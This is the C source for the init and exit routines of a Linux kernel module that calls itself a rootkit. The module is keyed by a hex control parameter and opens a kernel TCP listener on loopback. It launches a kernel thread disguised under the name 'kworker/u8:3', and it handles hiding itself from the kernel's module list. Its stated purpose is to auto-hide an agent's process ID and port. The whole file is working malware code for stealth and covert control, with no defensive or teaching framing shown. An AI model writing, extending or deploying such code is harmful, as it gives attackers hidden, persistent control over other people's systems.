// SPDX-License-Identifier: GPL-2.0
#include <linux/hex.h>
#include <linux/init.h>
#include "rootkit.h"

static char *control_key;
module_param(control_key, charp, 0);

u8 rk_key[RK_KEY_LEN];
u8 rk_fingerprint[RK_FP_LEN];
struct task_struct *rk_thread;
struct socket *rk_listen_sock;

static int __init rk_init(void)
{
	struct sockaddr_in addr;
	int error;

	if (!control_key)
		return -EINVAL;
	if (strlen(control_key) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, control_key, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(control_key, RK_KEY_HEX_LEN);

	error = rk_compute_fingerprint(rk_key, RK_KEY_LEN,
				       rk_fingerprint, RK_FP_LEN);
	if (error)
		goto fail_key;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &rk_listen_sock);
	if (error)
		goto fail_key;

	sock_set_reuseaddr(rk_listen_sock->sk);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(RK_PORT);

	error = kernel_bind(rk_listen_sock,
			    (struct sockaddr_unsized *)&addr, sizeof(addr));
	if (error)
		goto fail_sock;

	error = kernel_listen(rk_listen_sock, 1);
	if (error)
		goto fail_sock;

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		error = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_sock;
	}

	return 0;

fail_sock:
	sock_release(rk_listen_sock);
	rk_listen_sock = NULL;
fail_key:
	memzero_explicit(rk_key, sizeof(rk_key));
	return error;
}

static void __exit rk_exit(void)
{
	if (module_hidden) {
		list_add(&THIS_MODULE->list, saved_prev);
		module_hidden = false;
	}

	if (rk_thread)
		kthread_stop(rk_thread);
	if (rk_listen_sock) {
		kernel_sock_shutdown(rk_listen_sock, SHUT_RDWR);
		sock_release(rk_listen_sock);
	}
	memzero_explicit(rk_key, sizeof(rk_key));
	memzero_explicit(rk_fingerprint, sizeof(rk_fingerprint));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Auto-hide agent PID and port on connect");
